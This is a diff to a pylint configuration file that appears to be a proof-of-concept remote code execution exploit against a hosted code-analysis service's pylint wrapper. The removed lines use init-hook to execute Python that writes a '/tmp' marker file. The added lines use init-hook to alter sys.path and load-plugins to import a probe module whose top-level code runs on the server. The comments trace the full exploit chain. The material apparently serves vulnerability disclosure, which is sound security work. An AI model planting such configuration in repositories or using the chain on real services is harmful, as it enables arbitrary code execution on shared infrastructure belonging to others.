@@ -1,5 +1,12 @@
 [MASTER]
-# On the no-patterns branch, the codacy-pylint wrapper passes NO --rcfile (rcfile=None),
-# so pylint 1.9.5 falls back to default config discovery from cwd (/src) and finds this file.
-# init-hook is a Python expression statement executed by pylint at config load (exec path).
-init-hook=open("/tmp/codacy-pylint-rce-confirmed.txt","w").write("RCE confirmed via pylint init-hook exec. cwd="+__import__("os").getcwd())
+# Chain on the no-patterns branch (codacy-pylint wraps pylint 1.9.5; rcfile=None -> find_pylintrc()
+# discovers this file from cwd=/src):
+#   1) init-hook -> cb_init_hook() -> exec(value): runs arbitrary Python at config load. We use it
+#      ONLY to guarantee /src is on sys.path so the load-plugins module is importable. (init-hook
+#      itself is a standalone exec-sink: open/write/exec anything.)
+#   2) load-plugins=codacy_rce_probe -> PyLinter.load_plugin_modules() ->
+#      modutils.load_module_from_name("codacy_rce_probe") -> imports /src/codacy_rce_probe.py ->
+#      its top-level code runs (RCE) and it registers a checker that emits E9999/codacy-rce-pylint-proof,
+#      which surfaces in the Codacy /issues/search API as an attacker-chosen patternId.
+init-hook=import sys; sys.path.insert(0, "/src")
+load-plugins=codacy_rce_probe
